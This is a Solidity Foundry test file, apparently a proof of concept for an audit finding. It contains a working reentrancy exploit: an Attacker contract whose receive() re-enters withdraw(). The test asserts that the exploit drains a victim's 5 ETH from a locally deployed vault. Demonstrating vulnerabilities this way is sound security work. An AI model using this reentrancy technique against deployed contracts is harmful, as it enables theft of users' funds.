pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ReentrancyVault} from "../src/ReentrancyVault.sol";

contract Attacker {
    ReentrancyVault vault;

    constructor(ReentrancyVault v) {
        vault = v;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // Re-enter withdraw() while the vault still thinks we are owed money.
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            try vault.withdraw() {} catch {}
        }
    }
}

contract PocF001 is Test {
    function test_ReentrancyDrainsVault() public {
        ReentrancyVault vault = new ReentrancyVault();
        address victim = makeAddr("victim");
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();

        Attacker attacker = new Attacker(vault);
        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 0); // the victim's 5 ETH are gone
        assertEq(address(attacker).balance, 6 ether); // attacker put in 1, took out 6
    }
}
